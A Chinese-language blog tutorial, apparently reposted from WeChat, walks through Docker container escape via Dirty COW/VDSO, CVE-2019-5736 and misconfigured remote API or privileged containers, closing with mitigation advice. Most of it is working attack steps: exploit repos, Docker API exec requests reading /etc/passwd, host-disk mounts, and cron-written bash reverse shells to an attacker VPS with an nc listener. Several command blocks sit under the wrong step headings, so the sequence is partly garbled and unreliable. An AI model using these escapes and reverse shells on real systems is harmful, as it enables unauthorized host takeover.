> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5tKhYPvaOqA2y9udblGIXg)

前言  

获取某个系统 shell 后发现其是 docker，这时候我们就需要进行 docker 逃逸来拿到其真正宿主的权限。这里提供几种思路。

1.  利用 dirty cow 来进行 docker 逃逸
    
2.  cve-2019-5736
    
3.  docker 配置不当
    

**利用 dirty cow 来进行 docker 逃逸**
==============================

**1. 前置知识**
-----------

VDSO 其实就是将内核中的. so 文件映射到内存，.so 是基于 Linux 下的动态链接, 其功能和作用类似与 windows 下. dll 文件。

在 Linux 中，有一个功能：VDSO(virtual dvnamic shared object), 这是一个小型共享库，能将内核自动映射到所有用户程序的地址空间, 可以理解成将内核中的函数映射到内存中，方便大家访问。

**2. 利用 dirty cow 与 VDSO 来实现 docker 逃逸的过程**
-------------------------------------------

dirty cow 漏洞可以让我们获取只读内存的写的权限，我们首先利用 dirty cow 漏洞写入一段 shellcode 到 VDSO 映射的一段闲置内存中，然后改变函数的执行顺序，使得调用正常的任意函数之前都要执行这段 shellcode。这段 shellcode 初始化的时候会检查是否是被 root 调用，如果是则继续执行，如果不是，则接着执行 clock_gettime 函数，接下来它会检测 / tmp/.X 文件的存在，如果存在，则这时已经是 root 权限了，然后它会打开一个反向的 TCP 链接，为 Shellcode 中填写的 ip 返回一个 Shell。

这种利用方法利用成功的前提是，宿主机的内核有 dirty cow 漏洞。

**3. 利用过程**
-----------

### 1. 判断是否为 docker 环境

```
ls -alh /.dockerenv
```

docker 环境中根目录下存在此文件  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavxrGfZ0YIvHv7WhHBH4Rltfoyleict1no7fblUaBr7Uvod743vDtp06HJKjt3KZAib4dalC5w4WAfcQ/640?wx_fmt=png)  

查看系统进程的 cgroup 信息  

```
cat /proc/1/cgroup
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavxrGfZ0YIvHv7WhHBH4Rltff1qjMpz2s5ics8UVuhUzYSZef4OBqBYVfDMllpj5AfpK6bdMZdTEgVQ/640?wx_fmt=png)  

### 2. 下载脚本

```
git clone https://github.com/scumjr/dirtycow-vdso.git
cd /dirtycow-vdso/
make
```

```
./0xdeadbeef #反弹shell到本地主机
./0xdeadbeef ip:port #反弹shell到指定主机的指定端口
```

### 3. 利用脚本

```
ls -alh /.dockerenv
```

```
cat /proc/1/cgroup
```

我们直接反弹宿主机的 shell 到 127.0.0.1 如图所示  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavxrGfZ0YIvHv7WhHBH4Rltfiaiaj8PmwLYjETapb1I4vkbGCn0xRLdibwarFOrkM0ExdGQMxE8Y6h1eQ/640?wx_fmt=png)  
这时候我们进入 root 文件夹内创建一个任意文件，这里文件名我们定义为 random_file。  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavxrGfZ0YIvHv7WhHBH4RltfK9ANeTzh6bx4ibrPsziaxV4Wr9RTOS8LgibFT3prGRRQ33ANBic6pxfptQ/640?wx_fmt=png)  
这时候我们进入宿主机看看 (由于是实验环境，所以我们可以通过正常的渠道直接进入宿主机看漏洞利用情况)：  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavxrGfZ0YIvHv7WhHBH4Rltf7eEdUlgxmJtmcTqURjq1tGKg1Amk6cHdk40dQo52BlB3icLkzD21rRA/640?wx_fmt=png)  
发现宿主机上有我们刚创建的文件，至此 docker 逃逸成功。

可以通过 i 春秋的练习环境来进行此实验:  
利用 Dirty Cow 实现 Docker 逃逸

**通过 cve-2019-5736 来达到 docker 逃逸**
==================================

**1. 利用原理与条件**
--------------

通过在 docker 容器内重写和运行主机系统的 runc 二进制文件达到逃逸的目的。

利用条件为：

1.  runc 版本 <=1.0-rc6
    
2.  Docker Version < 18.09.2
    

**2. 漏洞触发过程**
-------------

首先我们得有一个 docker 下的 shell，第二步修改利用脚本中的反弹 shell 命令，第三步使用 go build 来编译脚本，第四步将脚本上传到 docker 中，第五步等待宿主机执行 exec 进入当前 docker 容器等时候，宿主机就会向我们的 vps 反弹 root 权限的 shell。

**3. 具体操作**
-----------

### 第一步：确定 docker 环境

```
git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
```

docker 环境中根目录下存在此文件  

查看系统进程的 cgroup 信息  

```
go build main.go
```

### 第二步：下载利用脚本并修改

```
docker exec -it test /bin/bash
```

下图中的选中部分修改 \ n 后面的命令为反弹 shell 命令即可。  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavxrGfZ0YIvHv7WhHBH4Rltfh1qwGicuUolO93xWVV8DQzRhpqqk77rUtUzoAgoVNrX1WPP8lqF3eUg/640?wx_fmt=png)

### 第三步：编译脚本

```
apt-get install docker.io
yum -y install docker
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavxrGfZ0YIvHv7WhHBH4RltfibnQPPj1DVWb06S5v2KQaicichNdxFyEaDAHcnszmEFCy111yb6q5uFvQ/640?wx_fmt=png)

### 第四步：将编译好的 main 文件上传到 docker 中

可以先上传到 github 然后在 docker 到 shell 中使用 git clone 命令即可，这里不做演示。

### 第五步：执行脚本并等待此 docker 再次被 exec

```
docker -H tcp://宿主机ip:2375 images
```

如上命令的含义是进入 test 这个容器，当宿主机上执行 exec 命令来进入我们运行了脚本的容器的时候，宿主机就会反弹 root 权限的 shell 给我们的 vps 的监听端口，至此利用结束。

4. 对此种方式利用的理解
-------------

这种方式利用的条件其实比较苛刻，主要苛刻在宿主机必须有人执行 exec 命令进入当前 docker 环境，如果没有人在宿主机执行的话，是无法进行 docker 逃逸的。

**配置不当导致 docker 逃逸**
====================

**1.docket remote api 未授权访问导致逃逸**
---------------------------------

docker swarm 是管理 docker 集群的工具。主从管理、默认通过 2375 端口通信。绑定了一个 Docker Remote API 的服务，可以通过 HTTP、Python、调用 API 来操作 Docker。由于环境复杂，这里借用 freebuf 上的图片。

### 确定 docker remote api 是否可访问

直接在浏览器中输入 http://ip:2375/version  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavxrGfZ0YIvHv7WhHBH4Rltfa1liclx2Db1UftensQcHOKbw2kLKyHJWV8cHgOvxhGV1T3OXBXmAxpQ/640?wx_fmt=png)

### 漏洞利用

1. 访问 http://ip:2375/containers/json 看是否出现以下画面：  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavxrGfZ0YIvHv7WhHBH4RltfkX9dQZYNKrjibiaybPXuPL5Xx6ZL8iaLJ1E3aIkCcmH6MEfWl3ZicNoHIg/640?wx_fmt=png)

2. 创建一个包，得到返回的 exec_id 的参数，数据包内容如下：

> POST /containers/<container_id>/exec HTTP/1.1  
> Host: <docker_host>:PORT  
> Content-Type: application/json  
> Content-Length: 188
> 
> {  
> “AttachStdin”: true,  
> “AttachStdout”: true,  
> “AttachStderr”: true,  
> “Cmd”: [“cat”, “/etc/passwd”],  
> “DetachKeys”: “ctrl-p,ctrl-q”,  
> “Privileged”: true,  
> “Tty”: true  
> }

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavxrGfZ0YIvHv7WhHBH4RltfqKakGnfzAqbNGFxuNLLTY2bwpLaSicibuicamQE43jQXHfUOMe5zgPtBA/640?wx_fmt=png)  
注意其中的 cmd 字段，这个就是要执行的命令。

3. 得到 exec_id 参数后构造第二个 exec_start 数据包，内容如下：

> POST /exec/<exec_id>/start HTTP/1.1  
> Host: <docker_host>:PORT  
> Content-Type: application/json
> 
> {  
> “Detach”: false,  
> “Tty”: false  
> }  
> 然后发送后会得到结果：  
> ![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavxrGfZ0YIvHv7WhHBH4Rltf0hw94icQlxxjHFQGVKCF4p8wZo56at0E2DzkIRSibVfFP0icGXWhc0iaUw/640?wx_fmt=png)  
> 至此成功获取到 docker 主机的命令执行权限，但是还无法逃逸到宿主机。

4. 在 docker 容器内安装 docker 作为 client  

```
docker -H tcp://宿主ip:2375 run -it -v /:/test adafef2e596e /bin/bash
```

5. 查看宿主机的 docker image 信息  

```
echo '* * * * * bash -i >& /dev/tcp/x.x.x.x/8888 0>&1' >> /test/var/spool/cron/root
```

6. 启动一个容器并且将宿主机的根目录抓再到容器的某个目录  

```
mkdir /nuoyan
mount /dev/vda1 /nuoyan
```

```
echo '* * * * * bash -i >& /dev/tcp/vps的ip/8888 0>&1' >> /nuoyan/var/spool/cron/root
```

7. 写一个计划任务反弹 shell(或者写. ssh 公钥都 OK)

```
nc -lvp 8888
```

```
8.在vps上使用nc命令等待反弹过来的shell
```

nc -lvp 8888

**利用特权模式逃逸**
============

漏洞原理
----

使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行 docker run —privileged 时，Docker 容器将被允许访问主机上的所有设备，并可以执行 mount 命令进行挂载。

漏洞利用
----

1. 查看磁盘文件  
fdisk -l  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavxrGfZ0YIvHv7WhHBH4RltficTicibicpxwKVgCcs9srQMmrloFaS3o9y6JMneAFB83sjsBNIZeqiaQLVQ/640?wx_fmt=png)

2. 将 / dev/vda1 也就是磁盘挂在到本地的任意文件下

```
mkdir /nuoyan
mount /dev/vda1 /nuoyan
```

此时这个 nuoyan 文件夹就相当于对方主机的根目录，可以进行写文件操作。

3. 写入计划任务

```
echo '* * * * * bash -i >& /dev/tcp/vps的ip/8888 0>&1' >> /nuoyan/var/spool/cron/root
```

```
4.在vps上等待shell反连接
```

```
nc -lvp 8888
```

**防止 docker 逃逸的方法**
===================

1、更新 Docker 版本到 19.03.1 及更高版本——CVE-2019-14271、覆盖 CVE-2019-5736  
2、runc 版本 > 1.0-rc6  
3、k8s 集群版本 > 1.12  
4、Linux 内核版本 >=2.6.22——CVE-2016-5195(脏牛)  
5、Linux 内核版本 >=4.14——CVE-2017–1000405(大脏牛)，未找到 docker 逃逸利用过程，但存在逃逸风险  
6、不建议以 root 权限运行 Docker 服务  
7、不建议以 privileged（特权模式）启动 Docker  
8、不建议将宿主机目录挂载至容器目录  
9、不建议将容器以—cap-add=SYSADMIN 启动，SYSADMIN 意为 container 进程允许执行 mount、umount 等一系列系统管理操作，存在容器逃逸风险

**参考文章**
========

https://www.freebuf.com/articles/container/242763.html

https://www.cnblogs.com/xiaozi/p/13423853.html

原创作者：Shanfenglan7

作者介绍：一个刚步入安全行业的人，乐意分享技术，乐意接受批评，乐意交流。希望自己能把抽象的技术用尽量具体的语言讲出来，让每个人都能看懂，并觉得简单。最后希望大家可以关注我的博客：shanfenglan.blog.csdn.net。

```
扫描关注乌雲安全


觉得不错点个“赞”、“在看”哦
```